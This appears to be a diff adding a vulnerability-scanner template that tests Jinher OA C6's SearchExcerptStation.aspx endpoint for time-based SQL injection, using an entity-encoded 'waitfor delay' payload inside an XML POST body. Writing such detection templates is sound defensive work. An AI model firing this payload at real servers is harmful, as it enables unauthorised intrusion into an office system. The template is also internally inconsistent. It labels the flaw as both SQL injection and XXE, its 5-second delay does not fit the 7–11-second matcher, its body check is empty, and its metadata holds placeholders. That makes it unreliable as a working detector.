@@ -1,0 +1,38 @@
+id: jinher-oa-c6-SearchExcerptStation-sqli
+info:
+  name: 金和OA SearchExcerptStation.aspx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 SearchExcerptStation.aspx 接口处存在XXE漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/gi2fvp0gzsxf0d6e
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,jinher
+
+http:
+  - raw:  
+      - |
+        @timeout: 20s
+        POST /c6/Jhsoft.Web.Appraise/SearchExcerptStation.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <root>
+        <node>&#x27;&#x77;&#x61;&#x69;&#x74;&#x66;&#x6f;&#x72;&#x20;&#x64;&#x65;&#x6c;&#x61;&#x79;&#x27;&#x30;&#x3a;&#x30;&#x3a;&#x35;&#x27;&#x2d;&#x2d;</node>
+        </root>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'')
+          - status_code == 200
+          - duration >= 7 && duration < 11
+        condition: and
